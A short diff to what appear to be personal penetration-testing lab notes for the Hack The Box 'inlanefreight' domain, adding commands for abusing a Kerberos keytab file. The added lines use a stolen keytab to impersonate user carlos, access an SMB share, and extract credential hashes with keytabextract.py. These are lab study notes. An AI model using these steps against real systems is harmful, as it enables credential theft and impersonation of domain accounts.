@@ -339,6 +339,23 @@ id julio@inlanefreight.htb
 ```
 <img width="1164" height="554" alt="image" src="https://github.com/user-attachments/assets/568b191c-fb0a-4737-b7fd-f1669cd370bf" />
 
+## Abusing KeyTab files
+```bash
+klist -k -t /opt/specialfiles/carlos.keytab
+
+klist
+kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
+klist
+smbclient //dc01/carlos -k -c ls
+```
+
+## KeyTab Extract
+```bash
+python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
+
+su - carlos@inlanefreight.htb
+```
+
 ## Importing the ccache file into our current session
 ```bash
 klist
